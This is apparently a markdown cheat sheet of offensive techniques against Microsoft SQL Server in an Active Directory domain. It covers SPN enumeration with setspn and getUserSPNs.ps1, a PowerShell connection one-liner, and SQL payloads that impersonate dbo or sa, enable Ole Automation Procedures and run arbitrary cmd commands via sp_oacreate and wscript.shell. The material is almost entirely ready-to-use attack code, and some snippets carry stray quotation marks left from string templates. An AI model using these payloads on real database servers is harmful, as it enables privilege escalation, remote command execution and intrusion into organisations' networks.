# Enumeration

### Enumerate AD for SPN's with built in setspn

``` Powershell
setspn -T corp1 -Q MSSQLSvc/*
```



### enumerate AD for SPNS with getUserSPNs.ps1

``` powershell
.\getUserSPNS.ps1
```

<br><br>

# Authentication with C#

### Powershell check connection 

```powershell
$connectionString = "Server=dc01;database=master;Integrated Security=True"; $sqlconn = [System.Data.SqlClient.SqlConnection]::new($connectionString); $sqlconn.Open(); $sqlCommand = [System.Data.SqlClient.SqlCommand]::new("SELECT * from song", $sqlconn); $sqldatareader = $sqlCommand.ExecuteReader(); while ($sqldatareader.Read()) { Write-Host $sqldatareader[0] }
```

### C# executable created called SQLHELPER


<img width="1367" height="312" alt="image" src="https://github.com/user-attachments/assets/df9f412a-b6c9-47b1-ac19-6e4ad0a580c6" />

<br><br>




## Command execution via xp_cmdshell or sp_oacreate/sp_oamethod

asuser
```sql
use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';
```

aslogin
```sql
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"'"
```
